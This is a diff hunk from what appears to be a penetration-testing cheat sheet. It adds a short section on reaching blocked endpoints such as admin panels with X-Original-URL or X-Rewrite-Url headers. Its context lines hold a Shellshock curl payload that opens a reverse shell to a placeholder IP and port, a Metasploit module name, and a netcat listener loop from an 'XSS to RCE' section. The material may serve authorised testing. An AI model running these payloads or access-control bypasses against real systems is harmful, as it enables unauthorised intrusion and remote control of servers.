@@ -531,6 +531,12 @@ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/IP/PORT 0>&1' http://Re
 
 `use multi/http/apache_mod_cgi_bash_env_exec`
 
+### Symfony / Frontend server rule bypass
+
+If we have don't have access to an endpoint could be an admin panel , we can just request for a `/` and at that point in either `X-Original-URL` or ` X-Rewrite-Url`
+
+https://githubmemory.com/repo/sting8k/BurpSuite_403Bypasser/issues/4
+
 ### XSS to RCE
 ```
 Attacker: while :; do printf "j$ "; read c; echo $c | nc -lp PORT >/dev/null; done
